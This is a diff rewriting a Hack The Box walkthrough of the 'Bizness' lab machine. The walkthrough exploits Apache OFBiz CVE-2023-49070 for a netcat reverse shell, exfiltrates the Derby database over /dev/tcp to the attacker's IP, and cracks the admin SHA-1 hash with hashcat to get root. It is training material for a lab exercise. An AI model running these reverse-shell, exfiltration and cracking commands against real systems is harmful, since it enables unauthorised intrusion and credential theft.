@@ -9,6 +9,7 @@ avatar: assets/htb/bizness.png
 tags: [Weak Credentials, Remote Code Execution, Misconfiguration, Insecure Design, Reconnaissance, Web Site Structure Discovery, Configuration Analysis, Password Reuse]
 htb_url: https://app.hackthebox.com/machines/Bizness
 ---
+
 # Bizness
 
 🔗 [Bizness](https://www.hackthebox.com/machines/bizness)
@@ -51,26 +52,25 @@ CVE-2023-49070
 
 </details>
 
-## Task 0 - Deploy machine
+## Summary
 
-🎯 Target IP: `<YOUR_IP>`
+Bizness is an easy Linux box running Apache OFBiz behind an NGINX reverse proxy. The OFBiz 18.12 instance is vulnerable to a pre-authentication remote code execution flaw (CVE-2023-49070) in its deprecated XML-RPC component, which I exploit to land a shell as the `ofbiz` user. From there, I dig through the OFBiz configuration and its embedded Apache Derby database to recover the admin's SHA-1 password hash, reshape it into a hashcat-friendly format, crack it, and reuse the recovered password to become root.
 
-On the Desktop, make a folder named after the machine, and inside it a second folder to hold the files and outputs the box requires, including the nmap scans.
+## Enumeration
 
-Once that's set up, bring up the VPN so we can reach the lab: `openvpn htb_vpn.ovpn`
+Before touching the target I set up a working directory and bring up the lab VPN. On the Desktop I make a folder named after the machine and a second folder inside it to hold scans and outputs, then connect with `openvpn htb_vpn.ovpn`.
 
-## Task 1 - Reconnaissance
+```bash
+su
+echo "<YOUR_IP> bizness.htb" >> /etc/hosts
 
-<pre class="language-bash"><code class="lang-bash">su
-<strong>echo "<YOUR_IP> bizness.htb" >> /etc/hosts
-</strong>
 mkdir -p htb/bizness.htb
 cd htb/bizness.htb
 mkdir {nmap,content,exploits,scripts}
 # At the end of the room
 # To clean up the last line from the /etc/hosts file
-<strong>sed -i '$ d' /etc/hosts
-</strong></code></pre>
+sed -i '$ d' /etc/hosts
+```
 
 I like to kick off recon with a ping to the target, which confirms connectivity and gives us a hint about the OS.
 
@@ -84,9 +84,9 @@ PING bizness.htb (<YOUR_IP>) 56(84) bytes of data.
 
 From these three ICMP replies, the Time To Live (TTL) is around 64, which points to a **\*nix** host; Windows machines typically report a TTL near 128.
 
-### 1.1 - How many TCP ports are listening on Bizness?
+### Port scanning
 
-Let's jump straight into an active port scan with nmap
+Next I jump straight into an active port scan with nmap.
 
 ```bash
 sudo nmap -p0- -sS -Pn -T4 -vvv bizness.htb -oN nmap/tcp_port_scan
@@ -100,13 +100,7 @@ PORT      STATE SERVICE REASON
 45853/tcp open  unknown syn-ack ttl 63
 ```
 
-<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>
-
-The scan turns up 4 open TCP ports: 22,80,443,45853.
-
-4
-
-Next, we enumerate the services running on those open ports:
+The scan turns up 4 open TCP ports: 22, 80, 443, 45853. With those identified, I enumerate the services running on them.
 
 ```bash
 sudo nmap -sV -sC -p 22,80,443,45853 bizness.htb -oN nmap/service_port_scan
@@ -137,138 +131,108 @@ ORT      STATE SERVICE    VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### 1.2 - What Enterprise Resource Planning (ERP) backend is in use?
+### Web discovery
 
-The web servers run nginx 1.18; we can verify this and pull additional details with the `whatweb bizness.htb` command:
+The web servers run nginx 1.18; I verify this and pull additional details with `whatweb bizness.htb`.
 
 ```bash
 http://bizness.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[<YOUR_IP>], RedirectLocation[https://bizness.htb/], Title[301 Moved Permanently], nginx[1.18.0]
 https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[<YOUR_IP>], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
 ```
 
-Then open the web server in a browser:
-
-Running directory enumeration with the Dirb tool and reviewing the page source doesn't reveal anything else useful.
+Opening the site in a browser and reviewing the page source doesn't reveal anything obviously useful, and directory enumeration with Dirb is similarly quiet.
 
 ```bash
 dirb https://bizness.htb 
 ```
 
-We do find an interesting page hosting a login form along with the ERP version:
+What it does surface, however, is an interesting page hosting a login form, which also leaks the ERP backend in use: this is an Apache OFBiz instance.
 
 <https://bizness.htb/accounting/control/main>
 
-apache ofbiz
+The OFBiz version is visible right on that page: **18.12**.
 
-### 1.3 - What version of OFBiz is running on the target system?
+## Foothold
 
-\
-The OFBiz version is already visible in the previous screen:
-
-18.12
-
-## Task 2 - Exploitation & User Flag
-
-### 2.1 - What is the 2023 CVE ID for a pre-authentication, remote code execution vulnerability on this version of OFBiz?
-
-With searchsploit we can quickly turn up an exploit for this version of Apache OFBiz
-
-search it on google to review possible alternatives and find the matching CVE ID
-
-that CVE is from 2024, so we need a 2023 one instead, so google: "ofbiz 18.12 CVE 2023"&#x20;
-
-and we land on a 2023 CVE on the nist site:&#x20;
+With the product and version in hand, searchsploit quickly turns up an exploit for this version of Apache OFBiz. Cross-referencing on Google, the first match is a 2024 CVE, but I want the 2023 pre-authentication RCE specifically, so searching for "ofbiz 18.12 CVE 2023" lands me on the NIST entry for CVE-2023-49070.
 
 <https://nvd.nist.gov/vuln/detail/cve-2023-49070>
 
-Pre-auth RCE in Apache Ofbiz 18.12.09, stemming from the deprecated XML-RPC component still being present. This issue affects Apache OFBiz: before 18.12.10. Users are recommended to upgrade to version 18.12.10
+This is a pre-auth RCE in Apache OFBiz 18.12.09, stemming from the deprecated XML-RPC component still being present. The issue affects Apache OFBiz before 18.12.10, and the fix is to upgrade to version 18.12.10.
 
-CVE-2023-49070
-
-### 2.2 - What user is the OFBiz service running as?
-
-A PoC for exploiting it lives on github: <https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass> and it bundles everything we need: the PoC plus the ysoserial-all.jar tool
-
-Always be careful what you download, open source / github does not mean 100% harmless program
-
-Download files locally using git clone command:
+A PoC for exploiting it lives on GitHub at <https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass>, and it bundles everything we need: the PoC plus the `ysoserial-all.jar` tool. As always, be careful what you download; open source / GitHub does not mean a program is 100% harmless. I clone it locally.
 
 ```bash
 git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
 ```
 
-check our attacker box machine IP using `ifconfig tun0` go in listening mode using netcat `nc -lvnp 1339` and into another shell, go run our exploit spawning a /bin/bash shell
+I check my attacker box IP with `ifconfig tun0`, start a listener with `nc -lvnp 1339`, and in another shell fire the exploit to spawn a `/bin/bash` reverse shell back to me.
 
 ```bash
 python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.17.177 1339'
 ```
 
+The shell that lands is running as the `ofbiz` service user.
+
 ```
 ofbiz
 ```
 
-### 2.3 - Submit the flag located in the ofbiz user's home directory.
+Moving to that user's home directory with `cd ~` and reading the flag gives us our user proof.
 
-Move to the user's home directory with cd \~ and cat the user flag
-
-<details>
-
-<summary>🚩 Flag 1 (user.txt)</summary>
-
+```bash
+cat user.txt
 f17c************************c401
+```
 
-</details>
+## Privilege Escalation
 
-## Task 3 - Privilege Escalation & Root Flag
+First I upgrade the shell into a more workable interactive one.
 
-### 3.1 - What is the full path of the directory that OFBiz is installed in?
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
 
-We can locate it under the /opt directory
+### Hunting the configuration and database
 
-/opt/ofbiz
+OFBiz is installed under `/opt/ofbiz`. Hunting through the configuration for the password hashing algorithm in use, the relevant file lives at `/opt/ofbiz/framework/security/config` and shows the application is configured to use **SHA**.
 
-### 3.2 - What hashing algorithm is the OFBiz installation configured to use for passwords?
+By default OFBiz uses an embedded **Apache Derby** database. Browsing the data-related folders confirms this: `/opt/ofbiz/runtime/data/derby/derby.log` holds the DB logs along with the database name and its version, and the Derby files themselves live under `/opt/ofbiz/runtime/data/derby`.
 
-To upgrade our shell into an interactive, more workable one run this command: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+Digging into `/opt/ofbiz/runtime/data/derby/ofbiz/seg0` reveals a set of `.dat` files. Grepping them for an `admin` string narrows things down to the files likely holding sensitive administrative strings.
 
-then start hunting through the configuration files for the hashing algorithm in use.
+```bash
+grep -a -l 'admin.$' *.dat
+```
 
-there's a relevant file at the path: /opt/ofbiz/framework/security/config that holds the answer:
+Inside a file called `c6650.dat` I find the admin credential blob:
 
-SHA
+```
+admin$"$SHA$$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+```
 
-### 3.3 - What database is used by Apache OFBiz, by default?
+### Extracting the hash with Derby tools
 
-Look for the directory tied to the database among the data-related folders.
+The `ij` utility doesn't appear to be present on the target, so I copy the `.dat` files over and install the Derby tools on my Kali attacker machine instead. First I archive the Derby directory:
 
-We found an interesting file at the path: `/opt/ofbiz/runtime/data/derby/derby.log` which holds the db logs along with the corresponding db name and its version
+```bash
+tar cvf /dev/shm/derby.tar derby
+```
 
-Apache Derby
+Then transfer it over netcat — listener on the attacker side, send from the target:
 
-### 3.4 - In which directory are the Derby-related files stored on Bizness?
+```bash
+nc -lvnp 4433 > derby.tar
+cat /dev/shm/derby.tar > /dev/tcp/10.10.17.177/4433
+```
 
-Browsing the folders, there's an interesting  file at path: /opt/ofbiz/runtime/data/derby/ofbiz/seg0 with more .dat files
+With the database on my machine, I extract the archive:
 
-Search them for an 'admin' string with this command: `grep -a -l 'admin.$' *.dat` to narrow down to the files likely holding sensitive administrative strings
+```bash
+tar -xvf derby.tar
+```
 
-and inside a file called: c6650.dat we found this value: `admin$"$SHA$$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`
-
-/opt/ofbiz/runtime/data/derby
-
-### 3.5 - Using derby-tools and the `ij` command-line utility, what is the command within `ij` to connect to a database stored in `./ofbiz`?
-
-Honestly, I may have already jumped ahead with the previous question.
-
-The ij utility doesn't appear to be present on this machine, so we'll copy the .dat files over and install the ij utility on our kali attacker machine instead.
-
-* Archive file using: `tar cvf /dev/shm/derby.tar derby`
-* Transfer derby files to attacker machine:&#x20;
-  * Go in listening mode on attacker machine: `nc -lvnp 4433 > derby.tar`
-  * Send file via netcat: `cat /dev/shm/derby.tar > /dev/tcp/10.10.17.177/4433`
-
-Now that the db is on the attacker machine, extract the archive with: `tar -xvf derby.tar`
-
-and we can install ij to connect to the db:
+and install `ij` to connect to it.
 
 ```bash
 sudo apt-install derby-tools
@@ -278,13 +242,9 @@ connect 'jdbc:derby:./ofbiz;create=true';
 show tables;
 ```
 
-In my case I had to tack on an extra 'true' flag to get the connection to open properly.
+In my case I had to tack on an extra flag (`create=true`) to get the connection to open properly; the base form of the connect command is `connect 'jdbc:derby:./ofbiz';`.
 
-connect 'jdbc:derby:./ofbiz';
-
-### 3.6 - Which table contains the SHA-1 hash of the `admin` user?
-
-Querying the db reveals the table holding the admin user's SHA-1 hash:
+Querying the database confirms which table holds the admin user's SHA-1 hash — `OFBIZ.USER_LOGIN`:
 
 ```sql
 select * from OFBIZ.USER_LOGIN;
@@ -292,81 +252,48 @@ describe OFBIZ.USER_LOGIN;
 select USER_LOGIN_ID,CURRENT_PASSWORD FROM OFBIZ.USER_LOGIN;
 ```
 
-Which is, of course, the same one we already know: `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`
+which is, of course, the same value we already pulled from the `.dat` file: `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`.
 
-```
-USER_LOGIN
-```
+### Cracking the hash
 
-### 3.7 - What is the hex version of the discovered hash?
+The hash `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` follows a SHA1-based format:
 
-We know the password hash: `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` follows a SHA1-based format
+* `$SHA$`: indicates the use of the SHA-1 hashing algorithm.
+* `d`: the salt used in the hashing process.
+* `uP0_QaVBpDWFeo8-dRzDqRwXQ2I`: the Base64 URL-encoded hash. After decoding, this represents the actual hash value.
 
-* `$SHA$`: This indicates the use of the SHA-1 hashing algorithm.
-* `d`: This is the salt used in the hashing process.
-* `uP0_QaVBpDWFeo8-dRzDqRwXQ2I`: This is the Base64 URL-encoded hash. After decoding, this represents the actual hash value.
-
-Decoding the Base64 URL-encoded String
+I decode the Base64 URL-encoded string into hex:
 
 ```bash
 echo "uP0_QaVBpDWFeo8-dRzDqRwXQ2I" | base64 -d | xxd -p > hash.txt
 ```
 
-* `base64 -d`: This decodes the Base64 URL-encoded string.
-* `xxd -p`: This converts the decoded bytes into a plain hexadecimal format. We need the hexadecimal version of the hash to use it in hashcat.
+Here `base64 -d` decodes the Base64 URL-encoded string and `xxd -p` converts the decoded bytes into plain hexadecimal, which is the form hashcat needs. The hex version of the hash is `b8fd3f41a541a435857a8f3e751cc3a91c174362`.
 
-This generates a file hash.txt containing the decoded hash in hexadecimal format.
-
-At this point, we have the decoded hash and we know the salt (`d`). However, hashcat expects the input hash to be in the format: `<hash>:<salt>`
+At this point we have the decoded hash and we know the salt (`d`). However, hashcat expects the input in the format `<hash>:<salt>`, so I assemble it accordingly:
 
 ```bash
 echo 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' > hash.txt
 ```
 
-```
-b8fd3f41a541a435857a8f3e751cc3a91c174362
-```
-
-### 3.7 - What is the root user's password?
-
-\
-Now we can move on to cracking the hash with hashcat, passing -m 120 since that maps to the hashing algorithm `sha1($salt.$pass)`
+Now I crack it with hashcat, passing `-m 120` since that maps to the hashing algorithm `sha1($salt.$pass)`.
 
 ```bash
 hashcat -m 120 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-recovering our password in cleartext: `b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness`
+which recovers the password in cleartext: `b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness`. The root password is **monkeybizness**.
 
-monkeybizness
+### Becoming root
 
-### 3.8 - Submit the flag located in the root user's home directory.
+Armed with the admin password, I switch to root with `su -` and grab the final flag.
 
-Finally, armed with the admin password, we can switch to root with the sudo command: `su -`
-
-<details>
-
-<summary>🚩 Flag 2 (root.txt)</summary>
-
+```bash
+cat root.txt
 751f************************f9b7
-
-</details>
+```
 
 ---
 
 # Agent Instructions
 This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
-
-## Querying This Documentation
-If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
-
-Perform an HTTP GET request on the current page URL with the `ask` query parameter:
-
-```
-GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/bizness.md?ask=<question>
-```
-
-The question should be specific, self-contained, and written in natural language.
-The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
-
-Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
